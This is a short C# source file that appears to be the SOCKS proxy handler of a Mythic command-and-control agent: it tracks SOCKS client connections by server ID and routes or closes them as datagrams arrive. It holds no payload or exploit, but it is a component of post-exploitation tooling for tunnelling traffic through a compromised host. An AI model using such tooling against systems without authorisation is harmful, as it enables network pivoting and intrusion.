using AI = PhantomInterop;
using PhantomInterop.Interfaces;
using PhantomInterop.Structs.MythicStructs;
using System.Collections.Concurrent;

namespace Phantom.Management.Socks
{
    public class ProxyHandler : AI.Classes.ProxyHandler
    {
        private ConcurrentDictionary<int, SocksClient> _connections = new ConcurrentDictionary<int, SocksClient>();
        
        public ProxyHandler(IAgent agent) : base(agent)
        {

        }

        public override bool Route(SocksDatagram dg)
        {
            if (!_connections.ContainsKey(dg.ServerID))
            {
                if (!dg.Exit)
                {
                    SocksClient c = new SocksClient(_agent, dg.ServerID);
                    _connections.AddOrUpdate(c.ID, c, (int i, SocksClient d) => { return d; });
                } else { return dg.Exit; }
            }
            if (dg.Exit)
            {
                _connections[dg.ServerID].Exit();
                return dg.Exit;
            }
            return _connections[dg.ServerID].HandleDatagram(dg);
        }

        public override bool Remove(int id)
        {
            _connections[id].Exit();
            return _connections.TryRemove(id, out SocksClient _);
        }
    }
}
